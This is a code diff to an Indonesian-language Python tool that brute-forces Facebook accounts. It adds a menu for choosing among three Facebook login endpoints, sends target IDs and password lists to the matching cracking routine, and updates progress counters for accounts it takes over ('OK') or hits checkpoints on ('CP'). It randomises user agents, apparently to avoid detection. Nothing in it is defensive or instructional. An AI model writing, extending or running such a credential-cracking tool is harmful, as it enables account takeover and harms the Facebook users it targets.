@@ -1091,6 +1091,16 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
+    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]validate.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',width=80,style=f"{color_panel}", title="[bold green] Method"))
+    hc = console.input(f" {H2}• {P2}Masukan : ")
+    if hc in ['1','01']:
+        method.append('mbasic')
+    elif hc in ['2','02']:
+        method.append('validate')
+    elif hc in ['3','03']:
+        method.append('reguler')
+    else:
+        method.append('mbasic')
     Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',title=f"[bold green]Setting User-Agent",width=80,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ['y','Ya','ya','Y']:
@@ -1146,8 +1156,14 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(crack3,idf,pwv)
-                
+                if 'reguler' in method:
+                    pool.submit(reguler,idf,pwv)
+                elif 'mbasic' in method:
+                    pool.submit(crack3,idf,pwv)
+                elif 'validate' in method:
+                    pool.submit(mbasic,idf,pwv)
+                else:
+                    pool.submit(crack3,idf,pwv)
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1163,10 +1179,8 @@ def passwrd():
 
 def crack3(idf,pwv):
     global loop,ok,cp
-    bi = random.choice([u,k,kk,b,h,hh])
-    pers = loop*100/len(id2)
-    fff = '%'
-    print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+    prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
     ua = random.choice(free)
     ua2 = random.choice(ugent)
     ses = requests.Session()
@@ -1227,7 +1241,7 @@ def mbasic(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua=random.choice(free)
 	ses = requests.Session()
@@ -1262,7 +1276,7 @@ def mbasic(idf,pwv):
 def reguler(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
-	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua=random.choice(free)
 	ses = requests.Session()
